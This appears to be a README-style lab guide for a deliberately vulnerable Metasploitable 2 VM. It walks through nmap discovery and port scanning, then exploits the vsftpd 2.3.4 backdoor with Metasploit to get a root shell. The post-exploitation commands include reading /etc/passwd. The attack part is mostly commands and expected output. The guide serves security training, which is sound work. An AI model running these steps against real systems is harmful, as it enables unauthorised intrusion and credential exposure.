#🚦 Step-by-Step Lab Guide

##🔎 Step 1: Discover Target IP 

First, identify the IP address of your Metasploitable 2 VM.
Run a ping sweep on your subnet (adjust subnet as per your VM network):

```bash
nmap -sn 192.168.56.0/24
```

Sample output:

```
Nmap scan report for 192.168.56.101
Host is up (0.00040s latency).
```
This shows the IP address of your Metasploitable 2 machine (e.g., 192.168.56.101).


##🔍 Step 2: Enumerate Open Ports and Services  
Use a service/version detection scan to enumerate all ports:

```bash
nmap -sV -p- 192.168.56.101
```

Key finding:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```

##🧨 Step 3: Exploit the VSFTPD 2.3.4 Backdoor Using Metasploit  
###Launch Metasploit Framework:

```bash
msfconsole
```

###Search for the vsftpd exploit module:

```bash
search vsftpd
```

###Select the appropriate exploit module:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

###Set the remote target IP:

```bash
set RHOSTS 192.168.56.101
```

###Run the exploit:

```bash
run
```

Expected output:

```
[*] Command shell session 1 opened (192.168.x.x:4444 -> 192.168.56.101:6200)
```

##🧾 Step 4: Post-Exploitation  
###List active sessions:

```bash
sessions
```

###Interact with your opened shell session:

```bash
sessions -i 1
```

###Run basic system commands to confirm access:

```bash
whoami
uname -a
cat /etc/passwd
```

Example output:

```
root
Linux metasploitable 2.6.24-16-server ...
```

🧪 Additional Exploration (Optional)  
Try exploiting other vulnerable services in Metasploitable 2:

- Telnet (port 23)  
- Samba (port 139)  
- Apache (port 80)  
- MySQL (port 3306)  

Or add other vulnerable targets:

- DVWA (Damn Vulnerable Web Application)  
- OWASP Juice Shop  
- HackMyVM  

📸 Key Screenshots

| Stage                      | Screenshot                     |
|----------------------------|------------------------------|
| Nmap scan showing FTP service | ![](images/nmap_scan.png)      |
| Metasploit module in use    | ![](images/vsftpd_exploit.png) |
| Shell access achieved       | ![](images/shell_session.png)  |
| Post-exploitation commands  | ![](images/whoami_result.png)  |

How to add screenshots  
Create a folder called images/ in your repository root.  
Upload your screenshots into that folder.  
Embed them using markdown like this:

```markdown
![](images/nmap_scan.png)
```

##⚠️ Legal Disclaimer  
This lab is for educational purposes only.  
Never scan, exploit, or access systems without explicit authorization.  
Always use isolated, local environments like VMs for practicing cybersecurity.

##🙌 Acknowledgments  
Thanks to:

- Offensive Security and Metasploit for their open tooling  
- The creators of Metasploitable 2  
- The cybersecurity community for shared knowledge  

⭐ If This Helped You  
⭐ Star this repo  
📢 Share it with fellow learners  
📝 Fork and improve this guide  

Keep learning and hacking — ethically! 🧑‍💻
